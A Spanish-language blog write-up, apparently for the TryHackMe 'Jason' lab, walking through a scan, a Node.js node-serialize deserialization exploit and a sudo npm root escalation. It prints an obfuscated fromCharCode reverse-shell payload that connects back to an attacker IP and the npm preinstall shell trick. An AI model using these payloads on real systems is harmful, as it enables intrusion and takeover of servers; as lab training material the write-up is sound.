<!doctype html><html lang=es>
<head>
<title>
Jason - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Fácil elbee    Reconocimiento Comenzando como en cada CTF, corremos nmap contra la máquina.
╰─ lanfran@parrot ❯ sudo nmap 10.10.237.12 -p- -sS --min-rate 5000 -n -Pn ─╯ [sudo] password for lanfran: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 20:11 CEST Nmap scan report for 10.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/es/posts/jason/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/es/posts/jason/cover.png">
<meta name=twitter:title content="Jason - Write Up - Español">
<meta name=twitter:description content="Máquina de nivel fácil en TryHackMe.">
<meta property="og:title" content="Jason - Write Up - Español">
<meta property="og:description" content="Máquina de nivel fácil en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/es/posts/jason/"><meta property="og:image" content="/es/posts/jason/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-12T20:02:42+02:00">
<meta property="article:modified_time" content="2021-10-12T20:02:42+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/es/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Jason - Write Up - Español</h1>
<div class=post-meta>
<span class=post-date>
2021-10-12
</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 6 mins lectura</span>
</div>
<span class=post-tags>
<a href=/tags/nodejs/>#NodeJS</a>&nbsp;
<a href=/tags/unserialize/>#unserialize</a>&nbsp;
<a href=/tags/sudo/>#sudo</a>&nbsp;
<a href=/tags/nc/>#nc</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/es/posts/jason/cover.png alt="Jason - Write Up - Español">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li>
<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
<li><a href=#root>Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Nivel</th>
<th>Creador</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/jason>Aquí</a></td>
<td>Fácil</td>
<td><a href=https://tryhackme.com/p/elbee>elbee</a></td>
</tr>
</tbody>
</table>
<h2 id=reconocimiento>Reconocimiento</h2>
<p>Comenzando como en cada CTF, corremos <code>nmap</code> contra la máquina.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo nmap 10.10.237.12 -p- -sS --min-rate <span style=color:#ae81ff>5000</span> -n -Pn                                                          ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-12 20:11 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.237.12
Host is up <span style=color:#f92672>(</span>0.25s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65533</span> closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 23.81 seconds
</code></pre></div><p>¡Bien! ¡Encontramos un servidor web ejecutándose en el puerto <code>80</code>!</p>
<p>¡Vayamos directamente a el!</p>
<p><img src=email.png alt=email></p>
<p>Es solo una página creada en <code>NodeJS</code> que nos muestra el correo electrónico que usamos.</p>
<p>Pero&mldr; ¡Tenemos una cookie de sesión!</p>
<p><img src=cookies.png alt=cookies></p>
<p>Tal vez podamos decodificarla para ver qué tiene dentro&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ echo <span style=color:#e6db74>&#34;eyJlbWFpbCI6ImFkbWluQGVtYWlsLmNvbSJ9&#34;</span> | base64 -d                                                        ─╯
<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;email&#34;</span>:<span style=color:#e6db74>&#34;admin@mail.com&#34;</span><span style=color:#f92672>}</span>% 
</code></pre></div><p>¡¡¡Excelente!!! ¡Sabemos que esta cookie almacena el correo electrónico que usamos como entrada!</p>
<h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
<p>Buscando en Google algún exploit de deserialización para NodeJS, encontré <a href=https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>este sitio</a>donde explican el exploit muy bien!</p>
<p>En resumen, necesitaremos crear un codigo para obtener una shell reversa en NodeJS, serializarlo y codificarlo en base64 para usarlo como nuestra cookie de sesión.</p>
<p><a href=https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py>Aquí está el archivo para crear el código para la shell reversa en NodeJS</a></p>
<p>Y después de obtener el código, puede usar la <a href=https://npm.runkit.com/node-serialize>online node-serialize</a> librería para serializar su payload! <a href=https://runkit.com/embed/g49fa5tg1ozl>Aquí</a> es una plantilla sobre cómo debería ser su código.</p>
<p>¡También te dejo el código a continuación!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;email&#34;</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>function</span>(){eval(String.<span style=color:#a6e22e>fromCharCode</span>(<span style=color:#a6e22e>your_payload</span>))}};

<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>serialize</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;node-serialize&#39;</span>);
<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>serialezd</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>.<span style=color:#a6e22e>serialize</span>(<span style=color:#a6e22e>y</span>);
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>serialezd</span>)
</code></pre></div><p>Después de eso, no olvides agregar el último () al final del payload, como te explican en <a href=https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>esta publicación</a>
<img src=last_().png alt=explain></p>
<p>Su código serializado debería verse similar a esto:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>{<span style=color:#e6db74>&#34;email&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;_$$ND_FUNC$$_function email() {\n          eval(String.fromCharCode(10, 118, 97, 114, 32, 110, 101, 116, 32, 61, 32, 114, 101, 113, 117, 105, 114, 101, 40, 39, 110, 101, 116, 39, 41, 59, 10, 118, 97, 114, 32, 115, 112, 97, 119, 110, 32, 61, 32, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 115, 112, 97, 119, 110, 59, 10, 72, 79, 83, 84, 61, 34, 49, 48, 46, 57, 46, 52, 46, 49, 49, 55, 34, 59, 10, 80, 79, 82, 84, 61, 34, 49, 51, 51, 55, 34, 59, 10, 84, 73, 77, 69, 79, 85, 84, 61, 34, 53, 48, 48, 48, 34, 59, 10, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 83, 116, 114, 105, 110, 103, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 99, 111, 110, 116, 97, 105, 110, 115, 32, 61, 61, 61, 32, 39, 117, 110, 100, 101, 102, 105, 110, 101, 100, 39, 41, 32, 123, 32, 83, 116, 114, 105, 110, 103, 46, 112, 114, 111, 116, 111, 116, 121, 112, 101, 46, 99, 111, 110, 116, 97, 105, 110, 115, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 116, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 116, 104, 105, 115, 46, 105, 110, 100, 101, 120, 79, 102, 40, 105, 116, 41, 32, 33, 61, 32, 45, 49, 59, 32, 125, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 40, 72, 79, 83, 84, 44, 80, 79, 82, 84, 41, 32, 123, 10, 32, 32, 32, 32, 118, 97, 114, 32, 99, 108, 105, 101, 110, 116, 32, 61, 32, 110, 101, 119, 32, 110, 101, 116, 46, 83, 111, 99, 107, 101, 116, 40, 41, 59, 10, 32, 32, 32, 32, 99, 108, 105, 101, 110, 116, 46, 99, 111, 110, 110, 101, 99, 116, 40, 80, 79, 82, 84, 44, 32, 72, 79, 83, 84, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 118, 97, 114, 32, 115, 104, 32, 61, 32, 115, 112, 97, 119, 110, 40, 39, 47, 98, 105, 110, 47, 115, 104, 39, 44, 91, 93, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 108, 105, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 34, 67, 111, 110, 110, 101, 99, 116, 101, 100, 33, 92, 110, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 108, 105, 101, 110, 116, 46, 112, 105, 112, 101, 40, 115, 104, 46, 115, 116, 100, 105, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 104, 46, 115, 116, 100, 111, 117, 116, 46, 112, 105, 112, 101, 40, 99, 108, 105, 101, 110, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 104, 46, 115, 116, 100, 101, 114, 114, 46, 112, 105, 112, 101, 40, 99, 108, 105, 101, 110, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 104, 46, 111, 110, 40, 39, 101, 120, 105, 116, 39, 44, 102, 117, 110, 99, 116, 105, 111, 110, 40, 99, 111, 100, 101, 44, 115, 105, 103, 110, 97, 108, 41, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 99, 108, 105, 101, 110, 116, 46, 101, 110, 100, 40, 34, 68, 105, 115, 99, 111, 110, 110, 101, 99, 116, 101, 100, 33, 92, 110, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 41, 59, 10, 32, 32, 32, 32, 125, 41, 59, 10, 32, 32, 32, 32, 99, 108, 105, 101, 110, 116, 46, 111, 110, 40, 39, 101, 114, 114, 111, 114, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 101, 116, 84, 105, 109, 101, 111, 117, 116, 40, 99, 40, 72, 79, 83, 84, 44, 80, 79, 82, 84, 41, 44, 32, 84, 73, 77, 69, 79, 85, 84, 41, 59, 10, 32, 32, 32, 32, 125, 41, 59, 10, 125, 10, 99, 40, 72, 79, 83, 84, 44, 80, 79, 82, 84, 41, 59, 10));\n        }()&#34;</span>}
</code></pre></div><p><em>No olvides el último () !!!! De lo contrario, el payload no funcionará.</em></p>
<p>Después de eso, ¡codifíquelo en base64 y utilícelo como una cookie!</p>
<p>Actualizando la página, <em>mientras escuchamos en el puerto deseado</em>, ¡ahora deberíamos tener una shell reversa como <code>Dylan</code>!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
connect to <span style=color:#f92672>[</span>10.9.4.117<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.237.12<span style=color:#f92672>]</span> <span style=color:#ae81ff>43016</span>
Connected!
id
uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>dylan<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>dylan<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>dylan<span style=color:#f92672>)</span>
cat /home/dylan/user.txt
0<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>c

</code></pre></div><h2 id=root>Root</h2>
<p>¡Excelente! ¡Escalemos a root!</p>
<p>¡Un reconocimiento normal nos da información útil!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>dylan@jason:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> dylan on jason:
    env_reset, mail_badpass,
    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User dylan may run the following commands on jason:
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/npm *
</code></pre></div><p>¡Nuestro usuario puede ejecutar <code>npm</code> como<code> root</code>!</p>
<p>Usando <a href=https://gtfobins.github.io/gtfobins/npm/>GTFOBins</a> podemos escalar fácilmente a root!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>dylan@jason:~$ TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -d<span style=color:#66d9ef>)</span>
dylan@jason:~$ echo <span style=color:#e6db74>&#39;{&#34;scripts&#34;: {&#34;preinstall&#34;: &#34;/bin/sh&#34;}}&#39;</span> &gt; $TF/package.json
dylan@jason:~$ sudo npm -C $TF --unsafe-perm i

&gt; @ preinstall /tmp/tmp.mskP1rW5qW
&gt; /bin/sh

<span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
<span style=color:#75715e># cat /root/root.txt</span>
2<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>e
</code></pre></div><p>¡Y hemos rooteado la máquina!</p>
<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Leer otros posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/es/posts/ide/>
<span class=button__icon>←</span>
<span class=button__text>IDE - Write Up - Español</span>
</a>
</span>
<span class="button next">
<a href=/es/posts/uranium_ctf/>
<span class=button__text>Uranium CTF - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
<div id=hyvor-talk-view></div>
<script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>